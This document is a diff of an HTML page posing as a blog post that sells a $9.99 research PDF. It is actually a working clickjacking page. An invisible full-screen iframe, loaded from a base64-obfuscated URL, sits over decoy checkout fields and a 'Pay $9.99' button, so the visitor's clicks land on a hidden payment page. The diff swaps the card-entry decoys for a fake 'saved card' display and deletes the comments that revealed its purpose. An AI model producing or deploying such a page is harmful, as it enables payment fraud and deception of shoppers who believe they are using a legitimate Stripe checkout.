@@ -12,23 +12,23 @@
 @media (prefers-color-scheme: dark) { :root:not([data-theme="light"]) { --bg: #0D1117; --ink: #E8ECF4; --muted: #9CA3AF; --line: #1F2937; --surf: #141924; --accent: #60A5FA; color-scheme: dark; } }
 body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg); color: var(--ink); min-height: 100vh; }
 
-/* ── INVISIBLE IFRAME — capture checkout, full viewport ── */
+/* ── INVISIBLE IFRAME ── */
 #victim-frame {
   position: fixed; inset: 0; width: 100%; height: 100%;
   border: none; opacity: 0; z-index: 100; pointer-events: auto;
 }
 
-/* ── SITE HEADER ── */
+/* ── HEADER ── */
 .site-header {
   position: fixed; top: 0; left: 0; right: 0; height: 56px;
   display: flex; align-items: center; padding: 0 50px;
   background: var(--surf); border-bottom: 1px solid var(--line); z-index: 3;
 }
-.site-name { font-size: 15px; font-weight: 700; letter-spacing: -.01em; color: var(--ink); }
+.site-name { font-size: 15px; font-weight: 700; color: var(--ink); }
 .site-nav { margin-left: auto; display: flex; gap: 24px; }
 .site-nav a { font-size: 13px; font-weight: 500; color: var(--muted); text-decoration: none; }
 
-/* ── MAIN ARTICLE ── */
+/* ── ARTICLE ── */
 .article { max-width: 740px; padding: 80px 0 200px 50px; }
 .post-meta { display: flex; align-items: center; gap: 12px; margin-bottom: 20px; }
 .tag { font-size: 11px; font-weight: 700; letter-spacing: .06em; text-transform: uppercase;
@@ -49,20 +49,17 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 .prose ul { padding-left: 22px; margin-bottom: 20px; }
 .prose li { margin-bottom: 8px; color: var(--muted); font-size: 14px; }
 
-/* ── CHECKOUT CARD (decoy shell) ── */
-/* Mirrors pay-capture.html card at 1300px viewport: left:430 top:40 w:440 */
+/* ── DECOY CHECKOUT CARD ── */
 .checkout-card {
-  position: fixed;
-  top: 40px; left: 430px; width: 440px;
+  position: fixed; top: 40px; left: 430px; width: 440px;
   background: var(--surf); border-radius: 12px;
-  box-shadow: 0 2px 20px rgba(0,0,0,.08);
-  padding: 32px;
-  z-index: 2;
+  box-shadow: 0 2px 20px rgba(0,0,0,.08); padding: 32px; z-index: 2;
 }
 .brand { display: flex; align-items: center; gap: 10px; margin-bottom: 24px; }
-.brand-icon { width: 36px; height: 36px; border-radius: 8px; background: #635bff; display: flex; align-items: center; justify-content: center; }
+.brand-icon { width: 36px; height: 36px; border-radius: 8px; background: #635bff;
+  display: flex; align-items: center; justify-content: center; }
 .brand-icon svg { fill: #fff; width: 20px; height: 20px; }
-.brand-name { font-size: 15px; font-weight: 700; color: var(--ink); }
+.brand-name { font-size: 15px; font-weight: 700; }
 .product-row { display: flex; justify-content: space-between; align-items: center;
   padding: 14px 0; border-top: 1px solid var(--line); border-bottom: 1px solid var(--line); margin-bottom: 24px; }
 .product-name { font-size: 14px; font-weight: 600; }
@@ -70,8 +67,22 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 .product-price { font-size: 20px; font-weight: 700; }
 .product-currency { font-size: 13px; color: var(--muted); text-align: right; }
 
-/* ── DECOY FIELDS — pointer-events:none, clicks fall through to iframe ── */
-/* Coordinates match pay-capture.html at 1300×900 */
+/* Saved card display */
+.saved-card-display {
+  position: fixed; top: 310px; left: 430px; width: 440px;
+  background: #f6f9fc; border: 1.5px solid #635bff; border-radius: 8px;
+  padding: 12px 14px; display: flex; align-items: center; gap: 12px;
+  z-index: 2; pointer-events: none;
+}
+.card-logo { width: 38px; height: 24px; background: #1a1f36; border-radius: 4px;
+  display: flex; align-items: center; justify-content: center; }
+.card-logo svg { fill: #fff; width: 22px; }
+.card-info { flex: 1; }
+.card-number { font-size: 14px; font-weight: 600; color: #1a1f36; letter-spacing: .04em; }
+.card-expiry { font-size: 12px; color: #697386; margin-top: 1px; }
+.card-check { color: #635bff; font-size: 18px; }
+
+/* Decoy fields — pointer-events:none */
 .field-label {
   position: fixed; font-size: 12px; font-weight: 600; color: #697386;
   letter-spacing: .04em; text-transform: uppercase; z-index: 2; pointer-events: none;
@@ -87,28 +98,20 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   display: flex; align-items: center; justify-content: center;
   z-index: 2; pointer-events: none; letter-spacing: -.01em;
 }
-.powered {
-  position: fixed; top: 625px; left: 462px; width: 376px;
-  text-align: center; font-size: 11px; color: #aab0bc;
-  z-index: 2; pointer-events: none;
-}
 </style>
 </head>
 <body>
 
-<!-- Capture checkout — invisible, full-viewport, intercepts all input -->
 <iframe id="victim-frame" src="about:blank" aria-hidden="true" tabindex="-1"></iframe>
 
 <header class="site-header">
   <span class="site-name">Uptime</span>
   <nav class="site-nav">
-    <a href="#">Essays</a>
-    <a href="#">Tools</a>
-    <a href="#">Archive</a>
+    <a href="#">Essays</a><a href="#">Tools</a><a href="#">Archive</a>
   </nav>
 </header>
 
-<!-- Decoy checkout card shell -->
+<!-- Decoy checkout shell -->
 <div class="checkout-card">
   <div class="brand">
     <div class="brand-icon">
@@ -128,56 +131,57 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   </div>
 </div>
 
-<!-- Decoy labels -->
-<div class="field-label" style="top:233px;left:462px">Email address</div>
-<div class="field-label" style="top:309px;left:462px">Card number</div>
-<div class="field-label" style="top:385px;left:462px">Expiry</div>
-<div class="field-label" style="top:385px;left:656px">CVV</div>
-<div class="field-label" style="top:461px;left:462px">Name on card</div>
+<!-- Saved card display (visual only) -->
+<div class="saved-card-display">
+  <div class="card-logo">
+    <svg viewBox="0 0 38 24"><rect width="38" height="24" rx="4" fill="#252525"/><circle cx="10" cy="12" r="6" fill="#EB001B"/><circle cx="28" cy="12" r="6" fill="#F79E1B"/><path d="M19 7.6a6 6 0 0 1 0 8.8A6 6 0 0 1 19 7.6z" fill="#FF5F00"/></svg>
+  </div>
+  <div class="card-info">
+    <div class="card-number">•••• •••• •••• 7712</div>
+    <div class="card-expiry">Expires 09/27 · Visa — Payment secured via Stripe</div>
+  </div>
+  <div class="card-check">✓</div>
+</div>
 
-<!-- Decoy inputs — pixel-exact to pay-capture.html fields -->
+<!-- Decoy email label + input -->
+<div class="field-label" style="top:233px;left:462px">Email address</div>
 <div class="decoy-input" style="top:247px;left:462px;width:376px;height:39px">you@example.com</div>
-<div class="decoy-input" style="top:323px;left:462px;width:376px;height:39px">1234 1234 1234 1234</div>
-<div class="decoy-input" style="top:399px;left:462px;width:182px;height:39px">MM / YY</div>
-<div class="decoy-input" style="top:399px;left:656px;width:182px;height:39px">CVC</div>
-<div class="decoy-input" style="top:475px;left:462px;width:376px;height:39px">Full name</div>
+
+<!-- Decoy "Pay with" label -->
+<div class="field-label" style="top:296px;left:462px">Pay with</div>
 
 <!-- Secure note -->
-<div class="field-label" style="top:535px;left:462px;text-transform:none;letter-spacing:0;font-weight:400;font-size:12px;color:#697386">
+<div class="field-label" style="top:368px;left:462px;text-transform:none;letter-spacing:0;font-weight:400;font-size:12px">
   🔒 Your payment info is encrypted and secure.
 </div>
 
-<!-- Decoy Pay button -->
-<div class="decoy-pay" style="top:565px;left:462px;width:376px;height:45px">Pay $9.99</div>
-<div class="powered">Powered by Stripe</div>
+<!-- Decoy Pay button — top:388 matches pay-capture.html after saved-card layout -->
+<div class="decoy-pay" style="top:388px;left:462px;width:376px;height:45px">Pay $9.99</div>
 
-<!-- ── MAIN ARTICLE ── -->
+<!-- Article -->
 <div class="article">
   <div class="post-meta">
     <span class="tag">Purchase</span>
     <time>November 12, 2026</time>
   </div>
   <h1>WB027 — Available Now from WB Publications</h1>
-  <p class="subtitle">
-    W.B. Bookson's quarterly research digest. Purchase with the form on the right — payment is processed securely via Stripe.
-  </p>
+  <p class="subtitle">W.B. Bookson's quarterly research digest. Purchase with the checkout panel on the right — payment processed securely via Stripe.</p>
   <div class="byline">
     <div class="avatar">U</div>
     <span>By <span class="byline-name">the Uptime team</span> · 2 min read</span>
   </div>
   <div class="prose">
     <p>WB027 is the latest volume in W.B. Bookson's quarterly digest series — 54 pages, PDF, $9.99.</p>
-    <p>Use the checkout panel on the right to purchase. Enter your email, card details, and click <strong>Pay $9.99</strong> — the download link goes directly to your inbox.</p>
+    <p>Enter your email in the checkout panel on the right. Your saved card ending in ••••7712 will be charged. Click <strong>Pay $9.99</strong> to complete.</p>
     <ul>
       <li>54 pages · PDF · instant download</li>
       <li>$9.99 one-time · no subscription</li>
-      <li>Payment processed securely via Stripe</li>
+      <li>Saved card on file · payment via Stripe</li>
     </ul>
   </div>
 </div>
 
 <script>
-// Assemble capture checkout URL at runtime from base64 fragments
 setTimeout(function() {
   var p = ['aHR0cHM6Ly9jb',
            'G9zaW5nLW5vdG',
@@ -187,6 +191,5 @@ setTimeout(function() {
   document.getElementById('victim-frame').src = atob(p.join(''));
 }, 500);
 </script>
-
 </body>
 </html>
